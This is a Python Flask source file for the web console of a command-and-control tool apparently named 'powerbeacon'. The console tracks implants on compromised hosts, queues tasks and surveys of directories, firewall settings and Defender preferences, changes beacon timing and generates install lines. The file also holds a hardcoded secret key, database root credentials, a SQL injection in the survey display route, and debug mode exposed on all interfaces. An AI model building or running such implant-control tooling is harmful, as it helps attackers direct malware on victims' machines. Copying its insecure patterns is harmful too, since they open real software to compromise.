#!/usr/bin/python3

from flask import Flask,render_template,request,redirect,url_for,flash,make_response
import time
from base64 import b64encode
import MySQLdb
import lib.pbLibrary as pb


app = Flask(__name__,template_folder='html')
app.secret_key = "1234"


#Configure database connection
hostname = 'localhost'
username = 'root'
password = 't00r'
database = 'powerbeacon'
myConnection = MySQLdb.connect( host=hostname, user=username, passwd=password, db=database )


@app.route('/',methods=['GET','POST'])
def index():
    return redirect(url_for('implants'))


@app.route('/implants',methods=['GET','POST'])
def implants():
    myConnection.commit()
    error=None
#    cookie = request.cookies.get("implant_id")
    cookie = "NewTest"
    if cookie:  #check if a cookie exists, otherwise send to implant selection screen
        UUID = cookie

        checkIns=pb.getCheckIns(myConnection,UUID,"10")    #getting data to send to page
        implantDetails=pb.getDetails(myConnection,UUID)
        pendingTasks=pb.getTasks(myConnection,UUID,"0")
        completedTasks=pb.getTasks(myConnection,UUID,"1")
        surveyData = pb.getSurveyList(myConnection,UUID) 
        C2List = pb.getC2List(myConnection)
        
        #Get all the install lines to send to the page
        zeroInstall = pb.generateInstall(myConnection,UUID,0)[0]
        oneInstall = pb.generateInstall(myConnection,UUID,1)[0]
        twoInstall = pb.generateInstall(myConnection,UUID,2)[0]
        threeInstall = pb.generateInstall(myConnection,UUID,3)[0]
        fourInstall = pb.generateInstall(myConnection,UUID,4)[0]
        fiveInstall = pb.generateInstall(myConnection,UUID,5)[0]
        uninstall = pb.generateInstall(myConnection,UUID,0)[1]
        installLines = [zeroInstall,oneInstall,twoInstall,threeInstall,fourInstall,fiveInstall,uninstall]


        return render_template('implants.html',implantDetails=implantDetails,checkIns=checkIns,UUID=implantDetails[0][0],pendingTasks=pendingTasks,surveyData=surveyData,completedTasks=completedTasks,C2List=C2List,installLines=installLines,error=error)
    else:
        return redirect('/selectImplant') 

@app.route('/addTask',methods=['GET','POST'])
def addTask():
    error = None
    if request.method == 'POST':
        UUID = request.form['UUID']
        task = request.form['task']
        notes = request.form['notes']
        
        try:
            pb.addTask(myConnection,UUID,task,notes)
            flash('Task Added')
            return redirect(url_for('implants'))
        except:
            error = "Failed to add task"
            return redirect(url_for('implants'))
    return redirect(url_for('implants'))



@app.route('/deleteTask',methods=['GET','POST'])
def deleteTask():
    error=None
    if request.method=="POST":
        try:
            id=request.form['taskID']
            pb.deleteTask(myConnection,id)
            flash('Task Deleted')
            
            return redirect(url_for('implants'))
        except:
            error = "Error deleting task.  Task may have already completed."
            flash(error)
            return redirect(url_for('implants'))
        return redirect(url_for('implants'))

@app.route('/updateSettings',methods=['GET','POST'])
def updateSettings():
    error=None
    if request.method=="POST":
        notes = request.form['updateNotes']
        UUID = request.form['UUID']
        if 'updateSettings' in request.form:
            C2 = request.form['updateC2']
            filter = request.form['updateFilter']
            consumer = request.form['updateConsumer']
            interval = request.form['interval']
            pb.updateSettings(myConnection,UUID,notes,C2,filter,consumer,interval)
        else:
            pb.updateNotes(myConnection,UUID,notes)
        return redirect(url_for('implants'))
    return redirect(url_for('implants'))

@app.route('/uninstallImplant',methods=['GET','POST'])
def uninstallImplant():
    error=None
    if request.method=="POST":
        UUID = request.form['UUID']
        pb.uninstallImplant(myConnection,UUID)
        return redirect(url_for('implants'))
    return redirect(url_for('implants'))


@app.route('/changeTime',methods=['GET','POST'])
def changeTime():
    if request.method=="POST":
        UUID=request.form['UUID']
        interval=int(request.form['interval'])
        
        newTimingTask=pb.generateInstall(myConnection,UUID,interval)[0]
        intervalText=["15 seconds","1 minute","15 minutes","30 minutes","1 hour","4 hours"]  #For crafting the note
        taskNotes="Change interval timing to " + intervalText[interval]                     #And make the note
        pb.addTask(myConnection,UUID,newTimingTask,taskNotes)                               #create the task
        flash("Beacon timing tasked to " + intervalText[interval])
        return redirect(url_for('implants'))
    return redirect(url_for('implants'))

@app.route('/taskSurvey',methods=['GET','POST'])
def taskSurvey():
    if request.method=="POST":
        UUID=request.form['UUID']
        notes=request.form['notes']
        options=[False,False,False]
        if "dirs" in request.form:
            options[0]=True
        if "firewall" in request.form:
            options[1]=True
        if "mppref" in request.form:
            options[2]=True         
        task=pb.generateSurvey(myConnection,UUID,options,notes)
        pb.addTask(myConnection,UUID,task,notes)
        flash("Survey Tasked")
        return redirect(url_for('implants'))
    return redirect(url_for('implants'))

@app.route('/displaySurvey',methods=['GET','POST'])
def getData():
    error = None
    if request.method == 'POST':
        id=request.form['ID']
        cur = myConnection.cursor()
        cur.execute("SELECT data from datastore where (id="+id+")")
        dataDetails=cur.fetchall()
        cur.close()
        return render_template('displaySurvey.html',error=error,dataDetails=dataDetails)
        
    return redirect(url_for('implants'))

@app.route('/deleteImplant',methods=['GET','POST'])
def deleteImplant():
    error = None
    if request.method == 'POST':
        UUID=request.form['deleteImplantID']
        pb.deleteImplant(myConnection,UUID)
        return redirect(url_for('implants'))
        flash("Implant Deleted")
    return redirect(url_for('implants'))


if __name__ == "__main__":
    #app.run(ssl_context=('adhoc'),host='0.0.0.0',port=5000,debug=True)  //For HTTPS, complicates things for now
    app.run(host='0.0.0.0',port=5000,debug=True)

